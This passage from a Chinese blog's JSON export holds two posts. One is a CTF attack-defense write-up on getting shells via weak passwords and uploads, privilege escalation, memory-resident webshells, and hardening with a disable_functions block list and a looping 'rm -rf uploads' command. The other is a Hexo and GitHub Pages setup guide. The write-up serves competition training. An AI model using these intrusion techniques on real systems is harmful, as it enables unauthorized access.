102/oreder/17 显示id为是17的信息，这里不熟悉参数的问题。(赛后才知道貌似是s2漏洞)沙盒3——103 是一个家具站点，asp+iis+2003，从后台弱口令admim admin 进入之后就是上传一个图片马，然后数据库备份，getshell 菜刀连接 不能执行cmd，上传一个cmd 执行命令，不是system 权限，使用菜刀+cmd+pr 提权添加用户，3389连接之后搜索flag ，最后主办方的提示：沙盒3有沙盒1的入口信息，到第二天的直接放出了沙盒1的入口点，是一个菜刀，需要你re一下，检测一下这菜刀的行为，怎么执行的。只get一个flag，并没有做更大化的信息收集，和后续的拓扑扫描。（不足点:后台备份getshell不是很熟，提权也出了一些问题） http://mycms7.cn.adminftp.com/ 沙盒3测试环境地址 沙盒4—eshop 一个开源的网店系统3.0版本，follow.php注入漏洞未能触发注入，这里也忘记测试后台是否有弱口令了，经验不足。 攻防模式二：web+pwn 服务器的组合。环境说明 web服务 首先是一个/home/user1/wwwroot目录下有flag文件Web目录权限是777 没有root权限 mysql 也是user1权限Web 先说一下一开始的环境，php+mysql 权限都是 r_x权限 目录在/home/user1/wwwroot/ 一开始web 我们就掉了2次分。首先搜索连接数据库的配置文件，进入数据库，修改后台的默认密码，删除其他必要的用户。然后进入web 目录下，修改目录权限。然后就坐等了一天，竟然web 就再没有掉分，我也很奇怪，人品爆发了。后来听到别人的思路就是一开始，上来，猜出了mysqlroot 的弱口令，udf 提权成功了(不是很清楚)，直接就2000分到手，我很想和师傅们聊聊人生。细节有待实现。正确的思路是：一开始可以先拼一波手速，破解默认的admin密码，直接去后台上传文件，先getshell 再说。实际是是说web至少有5个以上的漏洞，师傅们的思路是，注入到管理员的md5，进后台，上传文件 然后包含getshell。获取权限持续得分。正常的策略是tar 打包web 目录的文件到/tmp 目录下然后 scp 下载下来，审计测试。目录的权限如图Wwwroot 权限是7 子目录文件是 r 权限测试udf提权(赛后问了一下大家都没有root)定制脚本优化一下这里修补漏洞的方式：系统防护Netstat kill 进程自动化脚本暴力删除 敏感文件 首先备份网站目录， 后续的做diff命令比对，是否被写后门shel了没有l 首先我们写一个脚本把我们防护的脚本包含到php文件中进行防护然后可以写一个定时删除shell 文件的脚本，不允许在文件夹中写入文件 一：不知道漏洞首先包含php脚本到web文件中做url 参数获取日志后续在分析二：包含waf.php文件做sql注入xss、srf等漏洞的通用防护(做全局变量的防护)三：审计代码发现已知漏洞，做代码上的修补四：做流量的混淆，防止被人流量重放。五：包含自动删除shell脚本六：总结的思路，首先我们可以抓取别人的流量 然后利用别人留下的密码什么比如丝绸杯 我们当时发现我们的admin 表中被添加了用户我们可以用他这用户登录别人的服务器后台，然后再上传shell 什么的 Web 防护加固实现1.有root、administrator 权限的防护首先环境是phpweb防护，首先直接修改php.ini 修改 设置为安全模式然后直接禁止大小马的函数，disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server然后再开启安全模式pcntl_exec() 可以绕过http://security.ctocio.com.cn/tips/5/7764505_5.shtml全部禁止 2.非root权限的防护http://blog.csdn.net/andy1219111/article/details/9054277打包web目录文件下载保存扫描是否有内置后门常规的修改默认的用户名和密码 首先去查看web目录下链接sql的配置文件，获取数据库的密码，然后登陆数据库修改网站的默认后台密码。是否有file权限 修改web目录下文件的权限，设置600，指定目录的权限设置400等，具体的文件具体设置，或者直接设置upload文件权限为chmod 000 写一个自动删除shell的php脚本，白名单，自动删除目录下多出来的php文件Watch –n 1 rm –rf uploads 每1秒定时删除uploads 文件 加载防护waf safe 等php的脚本，抓取流量或者写脚本动态监控 脚本请参考&lt;攻防脚本中的连接地址&gt; 对特定的漏洞进行代码上的修改补上漏洞。 如果手速慢了被植入了内存马，一种是分析php-fmp进行进行查看，申请重启服务另一种是，内存马判断文件，可以手动添加一个文件，内容可以随意了，只要存在此文件名的文件就可以了7.如果主办方check的不严就直接删服务8.赛后向主办方申请要自己服务的日志，一定要做赛后总结，日志分析动态监控踩点防护 使用server.php 抓取 get,post,request等数据包 Py实施md5 检测目录，是否有新增、改动、减少等文件 手动检测本地测试具体办法：首先，php文件内容头批量先导入抓数据包的php脚本和waf脚本然后实施动态监控这里功能可以预先集成在一个py 脚本中具体方法和脚本在【加固脚本】文件夹中漏洞查找 首先扫描web文件，是否含有主办方隐藏的后门 附脚本：查找后门木马Opensns 这里就印证了主办方留有后门直接可以直接刷flag 再一系列的防护之后，代码审计是否有包含 命令执行漏洞 确认有漏洞上传的shell到uoload文件一般upload文件是777权限 所以我们可以Watch –n 1 rm –rf upload 每隔1秒 删除upload文件 内存马的使用，第三届网络空间大赛中学习到使用内存马+手速的模式，然后使用批量的脚本，感觉很无解 加载防护日志，抓取流量或者从别人的服务上分析shell使用别人的shell进行批量 应对备份查找后门，我们可以上传一个具有上传功能的upload.php,再使用内存马来进行隐藏 高一点的赛事，可能网上难以搜索到现成的exp、poc这时就需要审计代码，一般持续的时间相对比较久。附一下一些通用漏洞列表memcache未授权访问 java反序列(struts2可以细分) jenkis jenkis配置不当心脏出血 nosql未授权 glashfish任意文件读 ms10-070 padding orcles jdwp调试漏洞 mogodb未授权 iis put解析漏洞 svn信息泄露 redis未授权 域传送 iis短文件名 ElasticSearch漏洞….. 后待续一定好多动手复现，比赛的时候才能拼手速。最后复现P牛的这个漏洞库https://github.com/phith0n/vulhub/ 线下的经验参考 http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd linux 脚本维护系统 http://weibo.com/p/1001603847172578749357?mod=zwenzhang 这里猥琐的不死马和进程后门 http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/ http://bobao.360.cn/ctf/detail/169.html https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/ 线下的一些脚本上传到了github上了大家可以找一下","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.xjseck.com/tags/WEB/"}]},{"title":"博客的搭建过程","slug":"博客的搭建过程","date":"2017-09-07T15:09:49.000Z","updated":"2018-09-14T06:03:08.374Z","comments":true,"path":"2017/09/07/博客的搭建过程/","link":"","permalink":"https://www.xjseck.com/2017/09/07/博客的搭建过程/","excerpt":"","text":"前言搭建个人博客有两种方式 第一种使用自己独立的VPS和域名这种的方式就是可扩展的方式很多种，可以直接源码安装管理数据库等，比如安装typecho、WordPress等，如果是只是为了写博文就没有必要选择这种方式了，多花费买VPS的钱了。自行安装配置这里不再累述。 第二种使用github pages +hexo+域名的方式。这种方式个人感觉比较nice。安装的过程如下前期准备 Step1先安装git nodejs 的基础上安装 hexo1#npm install hexo-cli -g 如果npm安装不了需要使用淘宝的cnpm来代替123#npm install -g cnpm --registry=https://registry.npm.taobao.org#cnpm install hexo-cli -g#hexo -v //查看一下是否安装成功 Step2然后创建一个hexo1234567891011121314151617181920#cnpm install或者#npm install #hexo init hexo //这里如果出现不能连接到git上需要使用一下代理 当前目录下创建一个hexo文件里面是hexo源文件#git config --global https.proxy http://127.0.0.1:1080#git config --global https.proxy https://127.0.0.1:1080然后进入hexo文件下运行#cd hexo#cnpm install hexo --save或者#npm install hexo --save#sudo npm install --unsafe-perm --verbose -g hexo 如果运行错误，可以执行此命令本地测试运行hexo#hexo g#hexo s出现INFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.说明就成功了 创建github pages到这里我们已经本地能运行hexo了，配置好选择好自己喜欢的主题我们创建一个github pages Step1点击Create a new repository名字一定要填写你github的名字然后创建选择主题之后访问huseck.github.io，访问自己的 Step2使用git 来管理github的仓库前期需要配置ssh-key 连接到github上 123456#ssh-keygen –t rsa –C “邮箱地址” //可以什么都不用填写 把id_rsa.pub 的内容复制到github setting 中的ssh-keys 中然后git 配置#git config –global user.name “用户名”#git config –global user.email “邮箱”然后连接测试ssh –T git@github.com Step3 创建分支管理新创建的仓库的默认分支(branches)是master 我们需要再创建一个存放hexo源文件的分支新建一个空的文件 123456#git init#git remote add origin https://github.com/Huseck/huseck.github.io.git#git pull origin master#git branch hexo //创建分支#git checkout hexo#git push origin hexo 查看一个github上仓库会发现有两个分支了需要向hexo分支上传hexo的源文件123456#git remote add origin https://github.com/github名.github.io.git#git pull origin hexo#git checkout hexo#git add . //当前有hexo源文件的目录下#git commit -m &quot;hexo blog&quot;#git push origin hexo 上传成功然后我们上传静态文件到master分支1234567891011121314151617#hexo g#hexo s //会生成public 目录里面就是我们上传到master分支上的文件 //有两种方式上传1.是#hexo d 需要配置 在hexo 源文件的根目录_config.yml最后添加deploy: type: git repo: https://github.com/Huseck/huseck.github.io.git name: Huseck email: 504038236@qq.com branch: master //第二种方式直接进入public文件下，需要执行git的拉取选择仓库等命令比较繁琐#git init#git remote add origin https://github.com/github名.github.io.git#git pull origin master#git add .#git commit -m &quot;public file&quot;#git push origin master 多电脑进行博文编写如果我们的博客不是一个人在发布博文，或者换电脑了想实现这样的思路就是创建两个分支 一个装hexo生成的静态网页 一个装hexo源文件在其他电脑上发布博客的话思路就是克隆装hexo源文件的仓库，本地编写好.md文件，然后hexo g 编译成最新的静态网页，之后hexo d 发布到装有静态网页的仓库中，就实现了最新的博文发布了，最后，最后就是把hexo源文件编写的.md博文上传到hexo源文件的仓库中，避免其他人使用的时候把之前生成的静态博文冲突掉。注：一定需要保持hexo源文件的.md文件和生成的静态文件内容保持一致具体过程 确认电脑上有git 和nodejs环境首先是已经在github上添加ssh-keys了然后本目录下新建一个空的目录1234567891011121314151617181920#git init#git remote add origin https://github.com/Huseck/huseck.github.io.git#git pull origin hexo#git checkout hexo#cnpm install 或者 npm install #cnpm install hexo --save#hexo new &quot;博文名称&quot;#hexo g#hexo s //测试是否内容更新#hexo clean //清理一下缓存#hexo g#hexo s#hexo d //上传到master中另一种方法就是 先添加远程仓库，然后克隆分支，更新内容。git clone -b hexo git@github.com:Huseck/huseck.github.io.git安装 npm install npm install hexo --save然后运行 hexo s 调试最后push 到分支 注如果出现错误需要1git config --global push.default matching 消除此警告并采用新的设置值，输入：1git config --global push.default simple 然后重新init remote 等操作需要从头开始了 更新hexo源文件 1234#hexo clean#git add .#git commit -m &quot;upodate&quot;#git push origin hexo 更新一下域名总结其他人编写博文需要在github 添加ssh-keys然后拉取hexo源文件的分支今天编写.md文件上传到hexo源文件的分支仓库中，保持博文的最新之后就是#hexo d 上传静态html 绑定域名这里使用的是阿里云的域名直接配置解析首先获取IP地址ping github名.github.io然后填写到解析地址上之后需要配置github填写自定义的域名","categories":[{"name":"blog","slug":"blog","permalink":"https://www.xjseck.com/categories/blog/"}],"tags":[{"name":"blog","slug":"blog","permalink":"https://www.xjseck.com/tags/blog/"},{"name":"运维","slug":"运维","permalink":"https://www.xjseck.com/tags/运维/"}]}]}